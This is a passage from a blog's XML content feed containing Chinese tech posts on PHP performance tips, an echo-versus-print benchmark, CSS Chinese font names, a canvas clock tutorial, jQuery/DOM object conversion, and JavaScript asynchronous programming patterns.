&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .</p><p>详情：<a href="http://www.cnblogs.com/xueduanyang/archive/2013/05/30/3108442.html" target="_blank">http://www.cnblogs.com/xueduanyang/archive/2013/05/30/3108442.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 编码转换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP常用优化</title>
      <link href="/blog/2013/05/27/cb-php-optimization/"/>
      <url>/blog/2013/05/27/cb-php-optimization/</url>
      
        <content type="html"><![CDATA[<pre><span>0、用单引号代替双引号来包含字符串，这样做会更快一些。因为PHP会在双引号包围的字符串中搜寻变量，单引号则不会，注意：只有echo能这么做，它是一种可以把多个字符串当作参数的\函数"（译注：PHP手册中说echo是语言结构，不是真正的函数，故把函数加上了双引号）。1、如果能将类的方法定义成static，就尽量定义成static，它的速度会提升将近4倍。2、$row["id"] 的速度是$row[id]的7倍。3、echo 比 print 快，并且使用echo的多重参数（译注：指用逗号而不是句点）代替字符串连接，比如echo $str1,$str2。4、在执行for循环之前确定最大循环数，不要每循环一次都计算最大值，最好运用foreach代替。5、注销那些不用的变量尤其是大数组，以便释放内存。6、尽量避免使用__get，__set，__autoload。7、require_once()代价昂贵。8、include文件时尽量使用绝对路径，因为它避免了PHP去include_path里查找文件的速度，解析操作系统路径所需的时间会更少。9、如果你想知道脚本开始执行（译注：即服务器端收到客户端请求）的时刻，使用$_SERVER["REQUEST_TIME"]要好于time()。10、函数代替正则表达式完成相同功能。11、str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍。12、如果一个字符串替换函数，www.100jz.net可接受数组或字符作为参数，并且参数长度不太长，那么可以考虑额外写一段替换代码，使得每次传递参数是一个字符，而不是只写一行代码接受数组作为查询和替换的参数。13、使用选择分支语句（译注：即switch case）好于使用多个if，else if语句。14、用@屏蔽错误消息的做法非常低效，极其低效。15、打开apache的mod_deflate模块，可以提高网页的浏览速度。16、数据库连接当使用完毕时应关掉，不要用长连接。17、错误消息代价昂贵。18、在方法中递增局部变量，速度是最快的。几乎与在函数中调用局部变量的速度相当。19、递增一个全局变量要比递增一个局部变量慢2倍。20、递增一个对象属性（如：$this-&gt;prop++）要比递增一个局部变量慢3倍。21、递增一个未预定义的局部变量要比递增一个预定义的局部变量慢9至10倍。22、仅定义一个局部变量而没在函数中调用它，同样会减慢速度（其程度相当于递增一个局部变量）。PHP大概会检查看是否存在全局变量。23、方法调用看来与类中定义的方法的数量无关，因为我（在测试方法之前和之后都）添加了10个方法，但性能上没有变化。24、派生类中的方法运行起来要快于在基类中定义的同样的方法。25、调用带有一个参数的空函数，其花费的时间相当于执行7至8次的局部变量递增操作。类似的方法调用所花费的时间接近于15次的局部变量递增操作。26、Apache解析一个PHP脚本的时间要比解析一个静态HTML页面慢2至10倍。尽量多用静态HTML页面，少用脚本。27、除非脚本可以缓存，否则每次调用时都会重新编译一次。引入一套PHP缓存机制通常可以提升25%至100%的性能，以免除编译开销。28、尽量做缓存，可使用memcached。memcached是一款高性能的内存对象缓存系统，可用来加速动态Web应用程序，减轻数据库负载。对运算码 (OP code)的缓存很有用，使得脚本不必为每个请求做重新编译。29、当操作字符串并需要检验其长度是否满足某种要求时，你想当然地会使用strlen()函数。此函数执行起来相当快，因为它不做任何计算，只返回在zval 结构（C的内置数据结构，用于存储PHP变量）中存储的已知字符串长度。但是，由于strlen()是函数，多多少少会有些慢，因为函数调用会经过诸多步骤，如字母小写化（译注：指函数名小写化，PHP不区分函数名大小写）、哈希查找，会跟随被调用的函数一起执行。在某些情况下，你可以使用isset() 技巧加速执行你的代码。（举例如下）if (strlen($foo) &lt; 5) { echo \Foo is too short"$$ }（与下面的技巧做比较）if (!isset($foo{5})) { echo \Foo is too short"$$ }调用isset()恰巧比strlen()快，因为与后者不同的是，isset()作为一种语言结构，意味着它的执行不需要函数查找和字母小写化。也就是说，实际上在检验字符串长度的顶层代码中你没有花太多开销。34、当执行变量$i的递增或递减时，$i++会比++$i慢一些。这种差异是PHP特有的，并不适用于其他语言，所以请不要修改你的C或Java代码并指望它们能立即变快，没用的。++$i更快是因为它只需要3条指令(opcodes)，$i++则需要4条指令。后置递增实际上会产生一个临时变量，这个临时变量随后被递增。而前置递增直接在原值上递增。这是最优化处理的一种，正如Zend的PHP优化器所作的那样。牢记这个优化处理不失为一个好主意，因为并不是所有的指令优化器都会做同样的优化处理，并且存在大量没有装配指令优化器的互联网服务提供商（ISPs）和服务器。35、并不是事必面向对象(OOP)，面向对象往往开销很大，每个方法和对象调用都会消耗很多内存。36、并非要用类实现所有的数据结构，数组也很有用。37、不要把方法细分得过多，仔细想想你真正打算重用的是哪些代码？38、当你需要时，你总能把代码分解成方法。39、尽量采用大量的PHP内置函数。40、如果在代码中存在大量耗时的函数，你可以考虑用C扩展的方式实现它们。41、评估检验(profile)你的代码。检验器会告诉你，代码的哪些部分消耗了多少时间。Xdebug调试器包含了检验程序，评估检验总体上可以显示出代码的瓶颈。42、mod_zip可作为Apache模块，用来即时压缩你的数据，并可让数据传输量降低80%。43、在可以用file_get_contents替代file、fopen、feof、fgets等系列方法的情况下，尽量用file_get_contents，因为他的效率高得多！但是要注意file_get_contents在打开一个URL文件时候的PHP版本问题；44、尽量的少进行文件操作，虽然PHP的文件操作效率也不低的；45、优化Select SQL语句，在可能的情况下尽量少的进行Insert、Update操作(在update上，我被恶批过)；46、尽可能的使用PHP内部函数（但是我却为了找个PHP里面不存在的函数，浪费了本可以写出一个自定义函数的时间，经验问题啊！）；47、循环内部不要声明变量，尤其是大变量：对象(这好像不只是PHP里面要注意的问题吧？)；48、多维数组尽量不要循环嵌套赋值；49、在可以用PHP内部字符串操作函数的情况下，不要用正则表达式；50、foreach效率更高，尽量用foreach代替while和for循环；51、用单引号替代双引号引用字符串；52、\用i+=1代替i=i+1。符合c/c++的习惯，效率还高"；53、对global变量，应该用完就unset()掉； </span></pre>]]></content>
      
      
      <categories>
          
          <category> 后端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>echo和print效率测试对比</title>
      <link href="/blog/2013/05/27/cb-echo-print/"/>
      <url>/blog/2013/05/27/cb-echo-print/</url>
      
        <content type="html"><![CDATA[<p>测试代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#echo print 函数效率测试对比</span></span><br><span class="line">    <span class="variable">$old</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$new</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$one</span> = <span class="variable">$old</span> - <span class="variable">$new</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$one</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">#echo 函数测试结果</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$old</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$new</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$two</span> = <span class="variable">$old</span> - <span class="variable">$new</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$two</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">#print 函数测试结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$two</span> - <span class="variable">$one</span>) / <span class="variable">$two</span>; <span class="comment">#效率比较</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试结果：</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$one</span>:  0.35927200317383</span></span><br><span class="line"><span class="meta"><span class="keyword">$two</span>:  0.42829704284668</span></span><br><span class="line">(<span class="symbol">$</span>two - <span class="symbol">$</span>one) / <span class="symbol">$</span>two:  <span class="number">0.16116160694007</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>多次测试，发现echo比print效率高15%左右。</p><h3><strong>结果分析</strong></h3><p>echo和print功能上差不多，但是在基层的定义中：</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">print</span>(<span class="params">argument</span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span>(<span class="params"><span class="built_in">string</span> argument1, [, ...<span class="built_in">string</span> argumentN]</span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>print语句成功输出后，print()会返回1，而echo不返回。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 后端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css中font-family的中文字体</title>
      <link href="/blog/2013/05/26/cb-css-font-family/"/>
      <url>/blog/2013/05/26/cb-css-font-family/</url>
      
        <content type="html"><![CDATA[<p>说到css中的font-family，相信很多朋友经常用，但不知道当你遇到引用中文字体的时候你会怎么写？最近特别关注了下，发现最常用的基本有三种类型：</p><ol><li>1、直接中文；</li><li>2、英文形式；</li><li>3、unicode码；</li></ol><p>前面两种形式很好理解，unicode码是什么意思呢？下面看基本定义:</p><blockquote><p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</p></blockquote><p>更多内容请查看百度百科对<a class="exterUrl" href="http://baike.baidu.com/view/40801.htm" target="_blank">Unicode</a>的介绍。介绍完方案，再谈下使用。之前在看玉伯写的一篇文章《<span class="exterUrl">中文字体在 CSS 中的写法</span>》 中提到：font-family中用到的宋体，\用 unicode 表示，不用 SimSun, 是因为 Firefox 的某些版本和 Opera 不支持 SimSun 的写法"。我在网上搜索了下相关内容，大多都是摘抄这篇文章，并没有提到具体哪个版本的Firefox和Opera会不支持英文的写法。</p><p>对比下，三种方法各有优缺点：中文形式的方便记忆，但在不支持中文的系统或者编码的页面则无法正常显示；英文形式的兼容了系统和编码的问题，但不方便记忆，又可能有潜在的风险；unicode码兼容行最好，但也存在记忆难的问题。</p><p>综合权衡下，在性能和安全第一的条件下，还是推荐使用<strong>unicode码</strong>。如果不是太严格的情况下，可以选择其他两种。</p><p>下面整理下常用的各种字体的不同显示形式，方便使用的时候查找：</p><table class="fontTable"><thead><tr><th>中文名</th><th>英文名</th><th>Unicode</th></tr><tr><th colspan="4">Windows</th></tr></thead><tbody><tr><td><span><em>*</em>&nbsp;</span>宋体</td><td>SimSun</td><td>\5B8B\4F53</td></tr><tr><td><span><em>*</em>&nbsp;</span>黑体</td><td>SimHei</td><td>\9ED1\4F53</td></tr><tr><td><span><em>*</em></span>&nbsp;微软雅黑</td><td>Microsoft YaHei</td><td>\5FAE\8F6F\96C5\9ED1</td></tr><tr><td>微软正黑体</td><td>Microsoft JhengHei</td><td>\5FAE\x8F6F\6B63\9ED1\4F53</td></tr><tr><td>新宋体</td><td>NSimSun</td><td>\65B0\5B8B\4F53</td></tr><tr><td>新细明体</td><td>PMingLiU</td><td>\65B0\7EC6\660E\4F53</td></tr><tr><td>细明体</td><td>MingLiU</td><td>\7EC6\660E\4F53</td></tr><tr><td>标楷体</td><td>DFKai-SB</td><td>\6807\6977\4F53</td></tr><tr><td>仿宋</td><td>FangSong</td><td>\4EFF\5B8B</td></tr><tr><td>楷体</td><td>KaiTi</td><td>\6977\4F53</td></tr><tr><td>仿宋_GB2312</td><td>FangSong_GB2312</td><td>\4EFF\5B8B_GB2312</td></tr><tr><td>楷体_GB2312</td><td>KaiTi_GB2312</td><td>\6977\4F53_GB2312</td></tr></tbody><thead><tr><th colspan="4">Mac OS</th></tr></thead><tbody><tr><td><em>*</em>&nbsp;华文细黑</td><td>STHeiti Light [STXihei]</td><td>\534E\6587\7EC6\9ED1</td></tr><tr><td><em>*</em>&nbsp;华文黑体</td><td>STHeiti</td><td>\534E\6587\9ED1\4F53</td></tr><tr><td>华文楷体</td><td>STKaiti</td><td>\534E\6587\6977\4F53</td></tr><tr><td>华文宋体</td><td>STSong</td><td>\534E\6587\5B8B\4F53</td></tr><tr><td>华文仿宋</td><td>STFangsong</td><td>\534E\6587\4EFF\5B8B</td></tr><tr><td>丽黑 Pro</td><td>LiHei Pro Medium</td><td>\4E3D\9ED1 Pro</td></tr><tr><td>丽宋 Pro</td><td>LiSong Pro Light</td><td>\4E3D\5B8B Pro</td></tr><tr><td>标楷体</td><td>BiauKai</td><td>\6807\6977\4F53</td></tr><tr><td>苹果丽中黑</td><td>Apple LiGothic Medium</td><td>\82F9\679C\4E3D\4E2D\9ED1</td></tr><tr><td>苹果丽细宋</td><td>Apple LiSung Light</td><td>\82F9\679C\4E3D\7EC6\5B8B</td></tr></tbody></table><p><span>上表中标*为常用字体</span></p><p><span>本文转自：http://www.cnblogs.com/jiji262/archive/2012/02/13/2349851.html</span></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML5学习随笔（1）</title>
      <link href="/blog/2013/05/24/cb-canvas-clock/"/>
      <url>/blog/2013/05/24/cb-canvas-clock/</url>
      
        <content type="html"><![CDATA[<p><strong>关键词：</strong>HTML5， canvas， 时钟， 入门</p><p><strong>学习内容：</strong>通过制作canvas时钟了解canvas主要方法的使用</p><p><strong>DEMO：</strong><a href="http://qianduannotes.sinaapp.com/test/canvas.html" target="_blank">http://qianduannotes.sinaapp.com/test/canvas.html</a></p><h3>时钟设计</h3><p><strong>1. Design：</strong></p><p><img title="时钟" src="http://images.cnblogs.com/cnblogs_com/hustskyking/464217/o_%e6%97%b6%e9%92%9f.png" alt="时钟"></p><p><strong>2. colors：</strong></p><p>&nbsp; &nbsp; 表盘：<span>#ABCDEF</span>　　　　dialColor</p><p>&nbsp; &nbsp; 秒钟：<span>red</span>　　　　　　　 sColor</p><p>&nbsp; &nbsp; 秒钟原点： <span>gray</span>　　　　 sDotColor</p><p><strong>3. size：</strong></p><p>&nbsp; &nbsp; 画布：400*400　　　　 panel</p><p>&nbsp; &nbsp; 表盘：R = 160　　　　 &nbsp;dialR</p><p>&nbsp; &nbsp; 时针刻度：5*7　　　　　hW hH</p><p>&nbsp; &nbsp; 分针刻度：5*3　　　　　mW mH</p><p>&nbsp; &nbsp; 时针：10*130　　　　　hHW hHH</p><p>&nbsp; &nbsp; 分针：5*147　　　　　 &nbsp;mHW mHH</p><p>&nbsp; &nbsp; 秒钟：3*160　　　　　 &nbsp;sHW sHH</p><p>　 秒钟原点：r = 5　　　　 sDotR</p><p><strong>4. position</strong></p><p>&nbsp; &nbsp; 表盘中心：200*200　　 dialT dialL</p><p>&nbsp; &nbsp; 秒钟原点中心： 120　　 &nbsp;sDotP</p><h3>代码</h3><pre><code>var clock = document.getElementById(&#39;clock&#39;);var cxt = clock.getContext(&#39;2d&#39;);      //设置2D制图环境function draw()&#123;//清楚画布cxt.clearRect(0, 0, 400, 400);var now = new Date();var sec = now.getSeconds();var min = now.getMinutes();var hour = now.getHours();//小时必须是浮点类型(小时+分数转换成小时)hour = hour+min/60;hour = hour&gt;12?hour-12:hour;//表盘cxt.beginPath();cxt.lineWidth = 10;cxt.strokeStyle = &quot;#ABCDEF&quot;;cxt.arc(200, 200, 160, 0, 360, false);cxt.stroke();cxt.closePath();//刻度//时刻度for(var i = 0;i</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery对象与dom对象相互转换</title>
      <link href="/blog/2013/05/16/cb-jQuery-object-to-DOM-object/"/>
      <url>/blog/2013/05/16/cb-jQuery-object-to-DOM-object/</url>
      
        <content type="html"><![CDATA[<p>刚开始学习jQuery时可能一时会分不清楚哪些是jQuery对象、哪些是DOM对象。至于DOM对象不多解释，我们接触的太多了，下面重点介绍一下jQuery，以及两者相互间的转换。</p><h3><strong>什么是jQuery对象？</strong></h3><p>---就是通过jQuery包装DOM对象后产生的对象。jQuery对象是jQuery独有的，其可以使用jQuery里的方法。</p><p>比如：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#test&quot;</span>).html()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>意思是指：获取ID为test的元素内的html代码。其中html()是jQuery里的方法</p><p>这段代码等同于用DOM实现代码：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">document.getElementById(<span class="string">&quot;id&quot;</span>).innerHTML<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>虽然jQuery对象是包装DOM对象后产生的，但是jQuery无法使用DOM对象的任何方法，同理DOM对象也不能使用jQuery里的方法.乱使用会报错。比如：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#test&quot;</span>)<span class="selector-class">.innerHTML</span> <span class="comment">//错误写法</span></span><br><span class="line">document<span class="selector-class">.getElementById</span>(<span class="string">&quot;id&quot;</span>)<span class="selector-class">.html</span>()  <span class="comment">//错误写法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一个要注意的是：用#id作为选择符取得的是jQuery对象与document.getElementById("id")得到的DOM对象，这两者并不等价。</p><p>jQuery对象与DOM对象也可以相互转换。在两者转换前首先我们给一个约定：如果一个获取的是 jQuery对象，那么我们在变量前面加上$，如：var $variab = jQuery对象；如果获取的是DOM对象，则与习惯普通一样：var variab = DOM对象；这么约定只是便于讲解与区别，实际使用中并不规定。</p><h3><strong>jQuery对象转成DOM对象</strong></h3><p>两种转换方式将一个jQuery对象转换成DOM对象：[index]和.get(index);</p><p><strong>(1)jQuery对象是一个数据对象，可以通过[index]的方法，来得到相应的DOM对象。</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="symbol">$v</span> =$(<span class="string">&quot;#v&quot;</span>) ; <span class="comment">//jQuery对象</span></span><br><span class="line"><span class="keyword">var</span> v=<span class="symbol">$v</span>[<span class="number">0</span>]; <span class="comment">//DOM对象</span></span><br><span class="line">alert(v.checked) <span class="comment">//检测这个checkbox是否被选中</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>(2)jQuery本身提供，通过.get(index)方法，得到相应的DOM对象</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="symbol">$v</span>=$(<span class="string">&quot;#v&quot;</span>); <span class="comment">//jQuery对象</span></span><br><span class="line"><span class="keyword">var</span> v=<span class="symbol">$v</span>.get(<span class="number">0</span>); <span class="comment">//DOM对象</span></span><br><span class="line">alert(v.checked) <span class="comment">//检测这个checkbox是否被选中</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><strong>DOM对象转成jQuery对象</strong></h3><p>对于已经是一个DOM对象，只需要用$()把DOM对象包装起来，就可以获得一个jQuery对象了。$(DOM对象)</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v=document.getElementById(<span class="string">&quot;v&quot;</span>); <span class="comment">//DOM对象</span></span><br><span class="line"><span class="keyword">var</span> <span class="symbol">$v</span>=$(v); <span class="comment">//jQuery对象</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>转换后，就可以任意使用jQuery的方法了。</p><p>通过以上方法，可以任意的相互转换jQuery对象和DOM对象。</p><p><span><em><span>注：DOM对象才能使用DOM中的方法，jQuery对象是不可以用DOM中的方法。</span></em></span></p><p><span><span>* 参考链接：<em>http://www.chinaz.com/design/2010/0309/108144.shtml</em></span></span></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现Javascript异步编程的4种方法</title>
      <link href="/blog/2013/05/14/cb-four-method-to-Asynchronous/"/>
      <url>/blog/2013/05/14/cb-four-method-to-Asynchronous/</url>
      
        <content type="html"><![CDATA[<p><span>你可能知道，Javascript语言的执行环境是<span>"单线程"</span>（single thread）。</span></p><blockquote><p>所谓"单线程"，就是指一次只能完成一件任务。如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。</p></blockquote><p><span>这种模式的<strong><span>好处</span></strong>是实现起来比较简单，执行环境相对单纯；<strong><span>坏处</span></strong>是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。</span></p><p><span>为了解决这个问题，<span>Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）</span>。</span></p><ul><li><span>"同步模式"就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；"异步模式"则完全不同，每一个任务有一个或多个回调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异步的。</span></li><li><span>"异步模式"非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，"异步模式"甚至是唯一的模式，因为执行环境是单线程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。</span></li></ul><p><span>本文总结了"异步模式"编程的4种方法，理解它们可以让你写出结构更合理、性能更出色、维护更方便的Javascript程序。</span></p><p><strong><span>一、回调函数</span></strong></p><p><span>这是异步编程最基本的方法。</span></p><p><span>假定有两个函数f1和f2，后者等待前者的执行结果。</span></p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">f1</span>();</span><br><span class="line"><span class="built_in">f2</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>如果f1是一个很耗时的任务，可以考虑改写f1，把f2写成f1的回调函数。</span></p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">function <span class="built_in">f1</span>(callback)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(function () &#123;</span><br><span class="line">    <span class="comment">// f1的任务代码</span></span><br><span class="line">        <span class="built_in">callback</span>();</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>执行代码就变成下面这样：</span></p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">f1</span>(f2); <span class="comment">//回调</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>采用这种方式，我们把同步操作变成了异步操作，f1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。</span></p><p><span>回调函数的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。</span></p><p><strong><span>二、事件监听</span></strong></p><p><span>另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。</span></p><p><span>还是以f1和f2为例。首先，为f1绑定一个事件（这里采用的jQuery的写法）。</span></p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">f1.<span class="literal">on</span>(<span class="string">&#x27;done&#x27;</span>, f2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写：</span></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f1的任务代码</span></span><br><span class="line">        f1.<span class="title function_">trigger</span>(<span class="string">&#x27;done&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>f1.trigger('done')表示，执行完成后，立即触发done事件，从而开始执行f2。</span></p><p><span>这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以"去耦合"（Decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。</span></p><p><strong><span>三、发布/订阅</span></strong></p><p><span>我们假定，存在一个"信号中心"，某个任务执行完成，就向信号中心"发布"（publish）一个信号，其他任务可以向信号中心"订阅"（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做"发布/订阅模式"（publish-subscribe pattern），又称"观察者模式"（observer pattern）。</span></p><p><span>这个模式有多种实现，下面采用的是Ben Alman的Tiny Pub/Sub，这是jQuery的一个插件。</span></p><p><span>首先，f2向"信号中心"jQuery订阅"done"信号。</span></p><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jQuery.subscribe</span>(<span class="string">&quot;done&quot;</span>, <span class="built_in">f2</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>然后，f1进行如下改写：</span></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f1的任务代码</span></span><br><span class="line">        jQuery.<span class="title function_">publish</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span 